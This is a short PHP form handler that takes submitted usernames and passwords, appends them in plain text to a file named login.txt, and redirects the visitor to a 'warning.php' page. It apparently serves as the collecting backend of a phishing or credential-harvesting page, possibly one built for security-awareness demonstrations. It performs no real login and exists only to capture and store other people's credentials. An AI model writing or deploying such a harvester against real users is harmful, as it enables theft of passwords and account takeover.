<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // File to store login data
    $file = fopen("login.txt", "a");
    if ($file) {
        $data = "Username: $username\nPassword: $password\n\n";
        fwrite($file, $data);
        fclose($file);

        // Redirect to the warning page
        header("Location: warning.php");
        exit();
    } else {
        echo "Error opening the file.";
    }
} else {
    echo "Invalid request.";
}
?>